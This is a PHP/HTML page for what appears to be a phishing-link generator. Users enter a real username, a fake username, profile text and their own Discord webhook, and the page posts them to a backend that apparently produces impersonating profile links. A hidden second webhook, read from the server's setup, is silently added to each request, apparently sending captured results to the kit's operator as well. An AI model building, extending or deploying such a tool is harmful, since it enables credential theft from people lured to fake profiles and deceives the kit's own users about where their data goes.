<?php
require('../../setup.php');
?>
<html lang='en'>
<head>
<title><?=htmlspecialchars(file_get_contents('setup/name.txt'))?> | Generator</title>
<meta charset='UTF-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'>
<link rel='icon' type='image/png' href='<?=htmlspecialchars(base64_decode(file_get_contents('setup/thumbnail.txt')))?>'>
<link rel='stylesheet' type='text/css' href='/assets/generator/index.css'>
<link rel='stylesheet' href='//cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/css/all.min.css' integrity='sha512-+4zCK9k+qNFUR5X+cKL9EIR+ZOhtIloNl9GIKS57V1MyNsYpYcUrUeQc9vNfzsWfV28IaLL3i96P9sdNyeRssA==' crossorigin='anonymous'/>
<meta name='robots' content='noindex, follow'>
</head>
<body>
<div class="limiter">
<div class="container-login100">
<div class="wrap-login100">
<form class="login100-form validate-form p-l-55 p-r-55 p-t-178" action="javascript:generate()">
<span class="login100-form-title" style="background-color: #<?=htmlspecialchars(file_get_contents('setup/color.txt'))?>">
<?=htmlspecialchars(file_get_contents('setup/name.txt'))?> | Generator
</span>
<div class="wrap-input100 validate-input m-b-16">
<input class="input100" type="text" id="rusername" placeholder="Real Username">
<span class="focus-input100"></span>
</div>
<div class="wrap-input100 validate-input m-b-16">
<input class="input100" type="text" id="fusername" placeholder="Fake Username">
<span class="focus-input100"></span>
</div>
<div class="wrap-input100 validate-input m-b-16">
<input class="input100" type="text" id="aboutme" placeholder="About Me">
<span class="focus-input100"></span>
</div>
<div class="wrap-input100 validate-input">
<input class="input100" type="password" id="webhook" placeholder="Discord Webhook">
<span class="focus-input100"></span>
</div>
<br>
<div class="container-login100-form-btn">
<button class="login100-form-btn g-recaptcha" id="gen-btn" data-sitekey="<?=$public_key?>" data-callback="generate" style="background-color: #<?=htmlspecialchars(file_get_contents('setup/color.txt'))?>">
<i class="fas fa-plus-circle"></i>&nbsp;Create
</button>
</div>
<div class="flex-col-c p-t-170 p-b-40">
<a href="/controller/sign-in" class="txt3" style="color: #<?=htmlspecialchars(file_get_contents('setup/color.txt'))?>">
Login to Controller
</a>
</div>
</form>
</div>
</div>
</div>
<style>
.container-login100 {
background-image: url('/assets/controller/images/bg-controller.png');
}
.swal2-confirm {
background-color: #<?=htmlspecialchars(file_get_contents('setup/color.txt'))?> !important;
}
.grecaptcha-badge {
display:none;
}
</style>
<script>
function generate(token){
document.getElementById('gen-btn').innerHTML = '<i class="fas fa-circle-notch fa-spin"></i>&nbsp;Processing..';
var postfields = new FormData();
postfields.append('rusername', document.getElementById('rusername').value);
postfields.append('fusername', document.getElementById('fusername').value);
postfields.append('aboutme', document.getElementById('aboutme').value);
postfields.append('webhook', document.getElementById('webhook').value);
postfields.append('dwebhook', '<?=file_get_contents('setup/webhook.txt')?>');
postfields.append('token', token);
fetch('/api/generate', {
method: `POST`,
body: postfields,
}).then((response) => response.text())
.then((data) => {
document.getElementById('gen-btn').innerHTML = '<i class="fas fa-plus-circle"></i>&nbsp;Create';
if(data == 1){
Swal.fire(
  'Success!',
  '<b>Check your Discord Server for your link information!</b>',
  'success'
);
} else {
Swal.fire(
  'Failed!',
   data,
  'error'
);
}
});
}
</script>
<script src="//google.com/recaptcha/api.js" async defer></script>
<script src='//cdn.jsdelivr.net/npm/sweetalert2@11'></script>
</body>
</html>